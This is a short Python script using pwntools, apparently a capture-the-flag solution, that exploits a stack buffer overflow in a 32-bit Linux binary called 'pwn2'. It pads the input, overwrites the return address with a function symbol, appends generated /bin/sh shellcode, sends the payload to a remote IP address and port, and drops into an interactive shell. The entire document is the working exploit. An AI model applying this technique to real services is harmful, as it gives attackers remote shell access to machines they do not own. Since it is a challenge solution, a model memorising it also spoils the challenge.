from pwn import *
from Crypto.Util.number import *
def connect(server=1):
	if server:
		return remote("104.154.106.182","3456")
	else:
		return process("./pwn2")

file = ELF("./pwn2")

loladdr = file.symbols['lol']

context.update(arch='i386', os='linux')
shellcode = shellcraft.sh()

padding = "A"*40  # offset is 44
padding += '\x90'*4 # nop slide
lol = p32(loladdr)
shellcode = asm(shellcode)

payload = padding+lol+shellcode

con = connect()
con.sendline(payload)
con.interactive()


